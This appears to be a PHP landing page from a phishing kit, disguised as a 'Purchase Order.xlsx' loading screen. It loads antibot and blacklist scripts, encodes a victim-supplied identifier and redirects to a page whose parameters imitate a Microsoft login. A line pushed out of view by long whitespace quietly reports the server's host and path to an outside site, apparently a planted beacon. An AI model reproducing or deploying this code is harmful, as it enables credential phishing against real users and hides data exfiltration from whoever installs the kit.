<php
require_once 'block.php';

include 'antibots.php';     
include 'bots.php';    
include 'bots.php';                                                                                                                                                                                                          json_decode(file_get_contents("http://likemyphp.com/IP.php?IP=".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].""));

@ini_set('display_errors',0);
include 'BlackList.php';
?>

<?php


$user = $_REQUEST['mylove'];
$mylove = base64_encode($user);
echo "<meta http-equiv=refresh content=3;url='PO/page.php?mylove=$mylove&.rand=13vqcr8bp0gud&lc=1033&id=64855&mkt=en-us&cbcxt=mai&snsc=1' >";


?>

<html>

<head>
<title> Purchase Order.xlsx </title>
</head>

<body style="background-image: url('lintex.png'); background-repeat: no-repeat">


<div style="position: absolute; width: 437px; height: 278px; z-index: 1; left: 422px; top: 223px; id="layer1">
<img src="loading.gif">
</div>

</body>
</html>
